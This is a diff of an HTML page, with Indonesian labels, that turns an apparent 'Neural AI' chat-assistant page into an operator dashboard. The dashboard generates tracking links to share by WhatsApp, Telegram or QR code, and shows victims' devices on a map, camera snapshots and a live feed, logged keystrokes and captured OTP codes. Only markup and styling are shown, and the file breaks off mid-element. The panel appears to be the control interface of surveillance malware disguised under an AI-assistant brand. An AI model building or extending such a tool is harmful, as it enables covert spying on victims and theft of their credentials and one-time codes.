@@ -3,178 +3,1143 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Neural AI — Asisten Cerdas</title>
+<title>Dashboard — Neural AI</title>
+<meta name="theme-color" content="#05050f">
+<link rel="icon" type="image/svg+xml" href="/favicon.svg">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-body{font-family:'Plus Jakarta Sans',sans-serif;background:#05050f;color:#fff;height:100vh;overflow:hidden;display:flex;flex-direction:column}
-.header{display:flex;align-items:center;gap:12px;padding:16px 24px;border-bottom:1px solid rgba(255,255,255,0.06);background:rgba(10,10,30,0.8);backdrop-filter:blur(20px);flex-shrink:0}
-.header .logo{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,#00d4ff,#7c3aed);display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.header .logo svg{width:22px;height:22px}
-.header h1{font-size:1rem;font-weight:700;color:#fff}
-.header .status{font-size:.72rem;color:#6a6a8e;display:flex;align-items:center;gap:5px;margin-left:auto}
-.header .status .dot{width:6px;height:6px;border-radius:50%;background:#00d4ff;display:inline-block;animation:pulse 2s ease-in-out infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
-.chat-container{flex:1;display:flex;flex-direction:column;overflow:hidden;max-width:900px;width:100%;margin:0 auto;padding:0 20px}
-.messages{flex:1;overflow-y:auto;padding:24px 0;display:flex;flex-direction:column;gap:16px;scroll-behavior:smooth}
-.messages::-webkit-scrollbar{width:4px}
-.messages::-webkit-scrollbar-track{background:transparent}
-.messages::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:2px}
-.msg{max-width:85%;padding:14px 20px;border-radius:16px;font-size:.9rem;line-height:1.6;animation:msgIn .3s ease}
-@keyframes msgIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-.msg.user{align-self:flex-end;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;border-radius:16px 16px 4px 16px}
-.msg.bot{align-self:flex-start;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);color:#ccc;border-radius:16px 16px 16px 4px}
-.msg.bot .label{font-size:.72rem;color:#7c3aed;font-weight:600;margin-bottom:4px}
-.typing{align-self:flex-start;display:flex;gap:5px;padding:16px 20px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:16px 16px 16px 4px}
-.typing .dot{width:8px;height:8px;border-radius:50%;background:#6a6a8e;animation:typingBounce 1.4s ease-in-out infinite}
-.typing .dot:nth-child(2){animation-delay:.2s}
-.typing .dot:nth-child(3){animation-delay:.4s}
-@keyframes typingBounce{0%,60%,100%{transform:translateY(0);opacity:.4}30%{transform:translateY(-8px);opacity:1}}
-.input-wrap{display:flex;gap:10px;padding:16px 0 24px;flex-shrink:0}
-.input-wrap input{flex:1;padding:14px 20px;border-radius:14px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:.9rem;outline:none;font-family:inherit;transition:border-color .3s}
-.input-wrap input:focus{border-color:rgba(0,212,255,0.3)}
-.input-wrap input::placeholder{color:#4a4a6e}
-.input-wrap button{padding:14px 22px;border-radius:14px;border:none;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;cursor:pointer;font-size:.9rem;display:flex;align-items:center;justify-content:center;transition:all .3s;flex-shrink:0}
-.input-wrap button:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,212,255,0.2)}
-.input-wrap button:active{transform:scale(.97)}
-.welcome{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center;gap:16px;padding:40px}
-.welcome .icon{width:80px;height:80px;border-radius:24px;background:linear-gradient(135deg,#00d4ff,#7c3aed);display:flex;align-items:center;justify-content:center}
-.welcome .icon svg{width:40px;height:40px}
-.welcome h2{font-size:1.5rem;font-weight:700;letter-spacing:-.5px}
-.welcome p{color:#6a6a8e;font-size:.9rem;max-width:400px;line-height:1.6}
-.welcome .suggestions{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:8px}
-.welcome .suggestions button{padding:10px 18px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.03);color:#8a8aaa;font-size:.82rem;cursor:pointer;font-family:inherit;transition:all .3s}
-.welcome .suggestions button:hover{border-color:rgba(0,212,255,0.2);color:#00d4ff;background:rgba(0,212,255,0.05)}
-@media(max-width:600px){
-.header{padding:12px 16px}
-.chat-container{padding:0 12px}
-.msg{max-width:92%;font-size:.85rem;padding:12px 16px}
-.input-wrap input{padding:12px 16px;font-size:16px}
-.input-wrap button{padding:12px 16px}
-.welcome .suggestions button{font-size:.78rem;padding:8px 14px}
+body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f0f23;color:#fff;min-height:100vh;overflow:hidden}
+.bg-grid{position:fixed;inset:0;z-index:0;background-image:linear-gradient(rgba(255,255,255,0.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.015) 1px,transparent 1px);background-size:60px 60px;pointer-events:none}
+.header{position:relative;z-index:100;display:flex;align-items:center;padding:10px 20px;border-bottom:1px solid rgba(255,255,255,0.06);background:rgba(10,10,30,0.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);flex-shrink:0;height:56px}
+.header .logo{display:flex;align-items:center;gap:10px;text-decoration:none;margin-right:24px}
+.header .logo .mark{width:30px;height:30px;background:linear-gradient(135deg,#00d4ff,#7c3aed);border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.header .logo span{font-weight:700;color:#fff;font-size:.9rem;letter-spacing:-.3px}
+.header-stats{display:flex;gap:20px;align-items:center;margin-right:auto}
+.header-stat{display:flex;align-items:center;gap:6px;font-size:.78rem;color:#8a8aaa}
+.header-stat .num{color:#fff;font-weight:600}
+.tier-badge{display:inline-flex;align-items:center;gap:5px;padding:4px 12px;border-radius:20px;font-size:.72rem;font-weight:600;margin-right:12px}
+.tier-badge.free{background:rgba(255,255,255,0.06);color:#8a8aaa;border:1px solid rgba(255,255,255,0.06)}
+.tier-badge.pro{background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.2)}
+.lang-toggle{display:flex;gap:3px;background:rgba(15,15,37,0.8);border:1px solid rgba(255,255,255,0.06);border-radius:6px;padding:2px;margin-right:10px}
+.lang-toggle button{padding:4px 8px;border:none;background:none;color:#5a5a7e;font-size:.68rem;font-weight:600;cursor:pointer;border-radius:5px;font-family:inherit;transition:all .3s}
+.lang-toggle button.active{background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff}
+.btn-logout{padding:6px 14px;border-radius:6px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#8a8aaa;font-size:.75rem;font-weight:500;cursor:pointer;font-family:inherit;transition:all .3s}
+.btn-logout:hover{border-color:rgba(255,23,68,0.3);color:#ff6b6b;background:rgba(255,23,68,0.06)}
+.layout{position:relative;z-index:1;display:flex;height:calc(100vh - 56px);overflow:hidden}
+.sidebar{width:300px;min-width:300px;background:rgba(10,10,30,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-right:1px solid rgba(255,255,255,0.06);display:flex;flex-direction:column;height:100%;overflow:hidden}
+.sidebar-search{padding:12px 14px;border-bottom:1px solid rgba(255,255,255,0.06)}
+.sidebar-search input{width:100%;padding:9px 12px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:rgba(15,15,37,0.6);color:#fff;font-size:.8rem;font-family:inherit;outline:none;transition:border .3s}
+.sidebar-search input:focus{border-color:#00d4ff}
+.sidebar-search input::placeholder{color:#4a4a6e}
+.sidebar-list{flex:1;overflow-y:auto;padding:6px 0}
+.sidebar-list::-webkit-scrollbar{width:4px}
+.sidebar-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06);border-radius:2px}
+.sidebar-item{padding:10px 14px;cursor:pointer;border-left:3px solid transparent;transition:all .2s;display:flex;align-items:center;gap:10px;border-bottom:1px solid rgba(255,255,255,0.02)}
+.sidebar-item:hover{background:rgba(255,255,255,0.03)}
+.sidebar-item.active{border-left-color:#00d4ff;background:rgba(0,212,255,0.06)}
+.sidebar-item .s-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.sidebar-item .s-dot.online{background:#00d4ff;box-shadow:0 0 8px rgba(0,212,255,0.4)}
+.sidebar-item .s-dot.offline{background:#3a3a5e}
+.sidebar-item .s-info{flex:1;min-width:0}
+.sidebar-item .s-label{font-size:.8rem;font-weight:600;color:#ddd;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.sidebar-item .s-meta{font-size:.68rem;color:#5a5a7e;margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.sidebar-bottom{padding:14px;border-top:1px solid rgba(255,255,255,0.06);flex-shrink:0}
+.sidebar-bottom h4{font-size:.75rem;font-weight:600;color:#8a8aaa;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
+.sidebar-bottom .btn-gen{width:100%;padding:10px;border:none;border-radius:8px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:.8rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .3s}
+.sidebar-bottom .btn-gen:hover{transform:translateY(-1px);box-shadow:0 4px 20px rgba(0,212,255,0.25)}
+.sidebar-bottom .link-result{margin-top:10px;display:none}
+.sidebar-bottom .link-result.show{display:block;animation:fadeIn .3s ease}
+.sidebar-bottom .link-box{display:flex;align-items:center;gap:6px;padding:8px 10px;background:#0f0f25;border:1px solid #1e1e3e;border-radius:8px;margin-top:8px}
+.sidebar-bottom .link-box input{flex:1;background:none;border:none;outline:none;color:#fff;font-size:.75rem;font-family:inherit}
+.sidebar-bottom .link-box .copy-btn{padding:4px 10px;border:none;border-radius:5px;background:rgba(0,212,255,0.1);color:#00d4ff;font-size:.7rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .3s}
+.sidebar-bottom .link-box .copy-btn:hover{background:rgba(0,212,255,0.2)}
+.sidebar-bottom .share-row{display:flex;gap:5px;margin-top:8px;flex-wrap:wrap}
+.sidebar-bottom .share-btn{display:inline-flex;align-items:center;gap:4px;padding:5px 10px;border-radius:6px;border:none;font-size:.7rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .3s}
+.sidebar-bottom .share-btn.wa{background:rgba(37,211,102,0.15);color:#25d366}
+.sidebar-bottom .share-btn.wa:hover{background:rgba(37,211,102,0.25)}
+.sidebar-bottom .share-btn.tg{background:rgba(0,136,204,0.15);color:#0088cc}
+.sidebar-bottom .share-btn.tg:hover{background:rgba(0,136,204,0.25)}
+.sidebar-bottom .share-btn.em{background:rgba(255,255,255,0.06);color:#aaa}
+.sidebar-bottom .share-btn.em:hover{background:rgba(255,255,255,0.1)}
+.sidebar-bottom .qr-wrap{margin-top:8px;display:flex;justify-content:center}
+.sidebar-bottom .qr-wrap canvas,.sidebar-bottom .qr-wrap img{border-radius:8px;background:#fff;padding:5px;width:100px;height:100px}
+.sidebar-bottom .expiry-info{font-size:.7rem;color:#5a5a7e;margin-top:6px}
+.main-area{flex:1;display:flex;flex-direction:column;position:relative;overflow:hidden}
+.map-panel{flex:1;position:relative;min-height:0}
+.map-panel #map{width:100%;height:100%}
+.detail-panel{position:absolute;top:0;right:0;width:450px;height:100%;background:rgba(10,10,30,0.95);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-left:1px solid rgba(255,255,255,0.06);z-index:1000;display:none;flex-direction:column;overflow:hidden;transition:transform .3s}
+.detail-panel.open{display:flex;animation:slideIn .3s ease}
+.detail-panel.closed{display:none}
+@keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
+.detail-header{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.06);flex-shrink:0}
+.detail-header .dh-title{font-size:.9rem;font-weight:600;color:#fff;display:flex;align-items:center;gap:8px}
+.detail-header .dh-title .dh-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.detail-header .dh-title .dh-dot.online{background:#00d4ff;box-shadow:0 0 8px rgba(0,212,255,0.4)}
+.detail-header .dh-title .dh-dot.offline{background:#3a3a5e}
+.detail-header .dh-close{background:none;border:none;color:#5a5a7e;font-size:1.2rem;cursor:pointer;padding:4px 8px;border-radius:4px;transition:all .3s}
+.detail-header .dh-close:hover{color:#fff;background:rgba(255,255,255,0.06)}
+.detail-tabs{display:flex;padding:0 12px;border-bottom:1px solid rgba(255,255,255,0.06);overflow-x:auto;flex-shrink:0;gap:2px}
+.detail-tabs::-webkit-scrollbar{height:2px}
+.detail-tabs::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06);border-radius:1px}
+.detail-tab{padding:8px 10px;font-size:.7rem;font-weight:500;color:#5a5a7e;cursor:pointer;border-bottom:2px solid transparent;transition:all .3s;white-space:nowrap;background:none;border-top:none;border-left:none;border-right:none;font-family:inherit}
+.detail-tab:hover{color:#aaa}
+.detail-tab.active{color:#00d4ff;border-bottom-color:#00d4ff}
+.detail-body{flex:1;overflow-y:auto;padding:16px}
+.detail-body::-webkit-scrollbar{width:4px}
+.detail-body::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06);border-radius:2px}
+.tab-content{display:none}
+.tab-content.active{display:block;animation:fadeIn .2s ease}
+.info-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03);font-size:.78rem}
+.info-row:last-child{border-bottom:none}
+.info-row .il{color:#5a5a7e}
+.info-row .iv{color:#ccc;text-align:right;max-width:60%;word-break:break-all}
+.info-row .iv.accent{color:#00d4ff}
+.info-row .iv a{color:#00d4ff;text-decoration:none}
+.info-row .iv a:hover{text-decoration:underline}
+.snapshots-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-top:8px}
+.snapshots-grid .snap-item{position:relative;border-radius:6px;overflow:hidden;cursor:pointer;aspect-ratio:4/3;background:rgba(255,255,255,0.03)}
+.snapshots-grid .snap-item img{width:100%;height:100%;object-fit:cover;transition:transform .3s}
+.snapshots-grid .snap-item:hover img{transform:scale(1.05)}
+.snapshots-grid .snap-item .snap-time{position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.7);padding:3px 6px;font-size:.6rem;color:#aaa}
+.cam-actions{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+.cam-actions .cam-btn{padding:7px 14px;border:none;border-radius:6px;font-size:.72rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .3s}
+.cam-actions .cam-btn.primary{background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff}
+.cam-actions .cam-btn.primary:hover{box-shadow:0 4px 16px rgba(0,212,255,0.2)}
+.cam-actions .cam-btn.secondary{border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#aaa}
+.cam-actions .cam-btn.secondary:hover{color:#00d4ff;border-color:rgba(0,212,255,0.3)}
+.cam-actions .cam-btn.danger{border:1px solid rgba(255,23,68,0.2);background:rgba(255,23,68,0.08);color:#ff6b6b}
+.cam-actions .cam-btn.danger:hover{background:rgba(255,23,68,0.15)}
+.live-frame{display:none;margin-top:10px;border-radius:8px;overflow:hidden;background:#000;max-height:200px}
+.live-frame.show{display:block}
+.live-frame img{width:100%;display:block}
+.keystroke-box{background:#0f0f25;border:1px solid #1e1e3e;border-radius:8px;padding:10px;font-family:'Courier New',monospace;font-size:.75rem;color:#0f0;max-height:300px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5}
+.keystroke-box::-webkit-scrollbar{width:4px}
+.keystroke-box::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06);border-radius:2px}
+.k-stats{display:flex;gap:16px;margin-top:8px;flex-wrap:wrap}
+.k-stat{font-size:.72rem;color:#5a5a7e}
+.k-stat .ks-val{color:#fff;font-weight:600}
+.timeline-canvas{width:100%;height:60px;border-radius:6px;background:#0f0f25;border:1px solid #1e1e3e;cursor:pointer;display:block}
+.timeline-actions{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+.timeline-actions .tl-btn{padding:5px 12px;border:1px solid rgba(255,255,255,0.06);border-radius:6px;background:rgba(255,255,255,0.04);color:#8a8aaa;font-size:.7rem;font-weight:500;cursor:pointer;font-family:inherit;transition:all .3s}
+.timeline-actions .tl-btn:hover{color:#fff;border-color:rgba(0,212,255,0.3)}
+.timeline-actions .tl-btn.active{background:rgba(0,212,255,0.1);color:#00d4ff;border-color:rgba(0,212,255,0.2)}
+.timeline-actions .tl-btn.danger{color:#ff6b6b}
+.timeline-actions .tl-btn.danger:hover{border-color:rgba(255,23,68,0.3);background:rgba(255,23,68,0.06)}
+.timeline-events{max-height:200px;overflow-y:auto;margin-top:10px}
+.timeline-event{display:flex;gap:10px;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03);font-size:.75rem}
+.timeline-event .te-icon{font-size:1rem;width:20px;text-align:center;flex-shrink:0}
+.timeline-event .te-body{flex:1;min-width:0}
+.timeline-event .te-time{font-size:.65rem;color:#5a5a7e;margin-top:1px}
+.otp-list{margin-top:8px}
+.otp-item{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;background:#0f0f25;border:1px solid #1e1e3e;border-radius:6px;margin-bottom:6px;font-size:.8rem}
+.otp-item .otp-code{font-family:'Courier New',monospace;font-weight:700;color:#00d4ff;letter-spacing:2px}
+.otp-item .otp-time{font-size:.68rem;color:#5a5a7e}
+.otp-item.highlight{border-color:#00d4ff;background:rgba(0,212,255,0.06)}
+.otp-copy-btn{padding:4px 10px;border:none;border-radius:4px;background:rgba(0,212,255,0.1);color:#00d4ff;font-size:.7rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .3s;margin-top:8px}
+.otp-copy-btn:hover{background:rgba(0,212,255,0.2)}
+.export-actions{display:flex;flex-direction:column;gap:8px;margin-top:8px}
+.export-actions .exp-btn{padding:10px 16px;border:none;border-radius:8px;font-size:.8rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .3s;text-align:left;display:flex;align-items:center;gap:8px}
+.export-actions .exp-btn.primary{background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff}
+.export-actions .exp-btn.primary:hover{box-shadow:0 4px 16px rgba(0,212,255,0.2)}
+.export-actions .exp-btn.secondary{border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#aaa}
+.export-actions .exp-btn.secondary:hover{color:#fff;border-color:rgba(255,255,255,0.15)}
+.export-actions .exp-btn .exp-icon{font-size:1.1rem}
+.bottom-section{flex-shrink:0;max-height:40%;overflow:hidden;display:flex;flex-direction:column;border-top:1px solid rgba(255,255,255,0.06);background:rgba(10,10,30,0.9);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px)}
+.bottom-section .bs-header{display:flex;gap:0;border-bottom:1px solid rgba(255,255,255,0.06);flex-shrink:0}
+.bottom-section .bs-tab{padding:10px 20px;font-size:.78rem;font-weight:500;color:#5a5a7e;cursor:pointer;border-bottom:2px solid transparent;transition:all .3s;background:none;border-top:none;border-left:none;border-right:none;font-family:inherit}
+.bottom-section .bs-tab:hover{color:#aaa}
+.bottom-section .bs-tab.active{color:#00d4ff;border-bottom-color:#00d4ff}
+.bottom-section .bs-content{flex:1;overflow-y:auto;padding:12px 16px}
+.bottom-section .bs-content::-webkit-scrollbar{width:4px}
+.bottom-section .bs-content::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06);border-radius:2px}
+.bottom-section .bs-panel{display:none}
+.bottom-section .bs-panel.active{display:block;animation:fadeIn .2s ease}
+.links-list{display:flex;flex-direction:column;gap:6px}
+.link-item{display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(15,15,37,0.5);border:1px solid #1a1a2e;border-radius:8px;transition:all .3s;cursor:pointer}
+.link-item:hover{border-color:#2a2a4e}
+.link-item .li-info{flex:1;min-width:0}
+.link-item .li-name{font-size:.8rem;font-weight:600;color:#ccc}
+.link-item .li-meta{font-size:.68rem;color:#5a5a7e;margin-top:1px;display:flex;gap:8px;flex-wrap:wrap}
+.link-item .li-status{font-size:.68rem;font-weight:600;padding:2px 8px;border-radius:4px}
+.link-item .li-status.visited{background:rgba(0,212,255,0.1);color:#00d4ff}
+.link-item .li-status.pending{background:rgba(255,255,255,0.04);color:#5a5a7e}
+.link-item .li-status.expired{background:rgba(255,23,68,0.06);color:#ff6b6b}
+.device-cards{display:flex;flex-direction:column;gap:6px}
+.device-card{padding:10px 12px;background:rgba(15,15,37,0.5);border:1px solid #1a1a2e;border-radius:8px;cursor:pointer;transition:all .3s;display:flex;align-items:center;gap:10px}
+.device-card:hover{border-color:#2a2a4e}
+.device-card .dc-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.device-card .dc-dot.online{background:#00d4ff;box-shadow:0 0 8px rgba(0,212,255,0.4)}
+.device-card .dc-dot.offline{background:#3a3a5e}
+.device-card .dc-info{flex:1;min-width:0}
+.device-card .dc-name{font-size:.8rem;font-weight:600;color:#ddd}
+.device-card .dc-meta{font-size:.68rem;color:#5a5a7e;margin-top:1px}
+.device-card .dc-status{font-size:.68rem;font-weight:600;padding:2px 8px;border-radius:4px}
+.device-card .dc-status.online{background:rgba(0,212,255,0.1);color:#00d4ff}
+.device-card .dc-status.offline{background:rgba(255,255,255,0.04);color:#5a5a7e}
+.empty-state{text-align:center;padding:20px;color:#4a4a6e}
+.empty-state .empty-icon{font-size:1.8rem;margin-bottom:8px;opacity:.5}
+.empty-state p{font-size:.8rem}
+.modal-overlay{position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;padding:20px}
+.modal-overlay.open{display:flex;animation:fadeIn .2s ease}
+.modal-overlay img{max-width:95vw;max-height:95vh;border-radius:10px;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
+.modal-overlay .modal-close{position:absolute;top:20px;right:20px;background:none;border:none;color:#fff;font-size:2rem;cursor:pointer;opacity:.7;transition:opacity .3s;font-family:inherit}
+.modal-overlay .modal-close:hover{opacity:1}
+.toast-container{position:fixed;top:20px;right:20px;z-index:99999;display:flex;flex-direction:column;gap:8px}
+.toast{padding:12px 18px;border-radius:8px;font-size:.8rem;backdrop-filter:blur(20px);animation:toastIn .3s ease forwards;display:flex;align-items:center;gap:8px;min-width:280px;max-width:380px;box-shadow:0 8px 30px rgba(0,0,0,0.3)}
+.toast.success{background:rgba(10,30,20,0.9);border:1px solid rgba(0,212,255,0.2);color:#00d4ff}
+.toast.error{background:rgba(30,10,20,0.9);border:1px solid rgba(255,23,68,0.2);color:#ff6b6b}
+@keyframes toastIn{from{opacity:0;transform:translateX(100%)scale(0.95)}to{opacity:1;transform:translateX(0)scale(1)}}
+.toast.out{animation:toastOut .2s ease forwards}
+@keyframes toastOut{to{opacity:0;transform:translateX(50px)}}
+.loading-overlay{position:fixed;inset:0;z-index:99998;background:#0f0f23;display:none;flex-direction:column;align-items:center;justify-content:center}
+.loading-overlay.show{display:flex}
+.loading-overlay .spinner{width:40px;height:40px;border:3px solid #1a1a2e;border-top-color:#00d4ff;border-radius:50%;animation:spin .8s linear infinite}
+.loading-overlay .text{margin-top:16px;font-size:.9rem;color:#aaa}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.leaflet-container{background:#0a0a1a !important}
+.leaflet-control-zoom a{background:#1a1a2e !important;color:#fff !important;border-color:#2a2a4e !important}
+.leaflet-control-zoom a:hover{background:#2a2a4e !important}
+.leaflet-popup-content-wrapper{background:#1a1a2e !important;color:#fff !important;border-radius:10px !important;border:1px solid rgba(255,255,255,0.06)}
+.leaflet-popup-tip{background:#1a1a2e !important}
+.leaflet-popup-content{margin:10px 14px !important;font-size:.78rem !important}
+.marker-label{background:rgba(0,0,0,0.7);backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:2px 8px;color:#fff;font-size:.65rem;font-weight:600;white-space:nowrap}
+.marker-label.online{border-color:rgba(0,212,255,0.3)}
+@media(max-width:768px){
+.sidebar{width:260px;min-width:260px;position:fixed;left:-260px;top:56px;z-index:500;transition:left .3s;height:calc(100vh - 56px)}
+.sidebar.open{left:0}
+.detail-panel{width:100%!important}
+.header{padding:8px 12px}
+.header-stats{gap:10px}
+.header-stat{font-size:.68rem}
+.mobile-menu-btn{display:block!important;background:none;border:none;color:#aaa;font-size:1.2rem;cursor:pointer;padding:4px;margin-right:10px}
 }
+.mobile-menu-btn{display:none}
+.btn-gen.loading{opacity:.6;pointer-events:none}
+.btn-gen .spinner-small{display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;margin:0 auto}
+.btn-gen.loading .spinner-small{display:inline-block}
 </style>
 </head>
 <body>
 
+<div class="loading-overlay show" id="loadingOverlay">
+<div class="spinner"></div>
+<div class="text" data-i18n="dashboard.loading">Memuat dashboard...</div>
+</div>
+
+<div class="bg-grid"></div>
+
 <div class="header">
-    <div class="logo">
-        <svg viewBox="0 0 32 32" fill="none"><circle cx="16" cy="16" r="10" stroke="#fff" stroke-width="2"/><circle cx="16" cy="11" r="1.5" fill="#fff"/><circle cx="21" cy="14" r="1.5" fill="#fff"/><circle cx="21" cy="19" r="1.5" fill="#fff"/><circle cx="16" cy="22" r="1.5" fill="#fff"/><circle cx="11" cy="20" r="1.5" fill="#fff"/><circle cx="11" cy="15" r="1.5" fill="#fff"/></svg>
-    </div>
-    <h1>Neural AI</h1>
-    <div class="status"><span class="dot"></span> Neural Model v3</div>
+<button class="mobile-menu-btn" id="mobileMenuBtn" onclick="toggleMobileSidebar()">&#x2630;</button>
+<a href="/dashboard.html" class="logo">
+<div class="mark">
+<svg width="16" height="16" viewBox="0 0 32 32" fill="none"><circle cx="16" cy="16" r="10" stroke="#fff" stroke-width="2"/><circle cx="16" cy="11" r="1.5" fill="#fff"/><circle cx="21" cy="14" r="1.5" fill="#fff"/><circle cx="21" cy="19" r="1.5" fill="#fff"/><circle cx="16" cy="22" r="1.5" fill="#fff"/><circle cx="11" cy="20" r="1.5" fill="#fff"/><circle cx="11" cy="15" r="1.5" fill="#fff"/></svg>
+</div>
+<span>Neural AI</span>
+</a>
+<div class="header-stats">
+<div class="header-stat" id="statDevices"><span class="num">0</span> Devices</div>
+<div class="header-stat" id="statOnline"><span class="num">0</span> Online</div>
+<div class="header-stat" id="statLinks"><span class="num">0</span> Links</div>
+</div>
+<div class="tier-badge free" id="tierBadge">Free</div>
+<div class="lang-toggle">
+<button id="langId" class="active" onclick="setLang('id')">ID</button>
+<button id="langEn" onclick="setLang('en')">EN</button>
+</div>
+<button class="btn-logout" onclick="handleLogout()" data-i18n="dashboard.logout">Keluar</button>
 </div>
 
-<div class="chat-container">
-    <div class="messages" id="messages">
-        <div class="welcome" id="welcomeScreen">
-            <div class="icon">
-                <svg viewBox="0 0 32 32" fill="none"><circle cx="16" cy="16" r="10" stroke="#fff" stroke-width="2"/><circle cx="16" cy="11" r="1.5" fill="#fff"/><circle cx="21" cy="14" r="1.5" fill="#fff"/><circle cx="21" cy="19" r="1.5" fill="#fff"/><circle cx="16" cy="22" r="1.5" fill="#fff"/><circle cx="11" cy="20" r="1.5" fill="#fff"/><circle cx="11" cy="15" r="1.5" fill="#fff"/></svg>
-            </div>
-            <h2>Selamat datang di Neural AI</h2>
-            <p>Asisten kecerdasan buatan yang siap membantu Anda dengan pertanyaan, analisis, dan tugas sehari-hari.</p>
-            <div class="suggestions">
-                <button onclick="suggest('Apa itu Neural AI?')">Apa itu Neural AI?</button>
-                <button onclick="suggest('Bantu saya menulis email')">Bantu menulis email</button>
-                <button onclick="suggest('Jelaskan AI dalam 3 kalimat')">Jelaskan AI</button>
-                <button onclick="suggest('Ide untuk konten sosial media')">Ide konten</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="input-wrap">
-        <input id="chatInput" type="text" placeholder="Ketik pesan ke Neural AI..." autocomplete="off">
-        <button id="sendBtn">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
-        </button>
-    </div>
+<div class="layout">
+<div class="sidebar" id="sidebar">
+<div class="sidebar-search">
+<input type="text" id="searchInput" data-i18n="dashboard.searchDevice" placeholder="Cari device..." oninput="filterDevices()">
+</div>
+<div class="sidebar-list" id="sidebarList"></div>
+<div class="sidebar-bottom">
+<h4 data-i18n="dashboard.newLink">Buat Link Baru</h4>
+<button class="btn-gen" id="generateBtn" onclick="generateLink()"><span class="spinner-small"></span> <span id="genBtnText" data-i18n="dashboard.generate">Generate Tracking Link</span></button>
+<div class="link-result" id="linkResult">
+<div class="link-box">
+<input type="text" id="trackingLink" readonly>
+<button class="copy-btn" onclick="copyLink()" data-i18n="dashboard.copy">Salin</button>
+</div>
+<div class="share-row" id="shareRow">
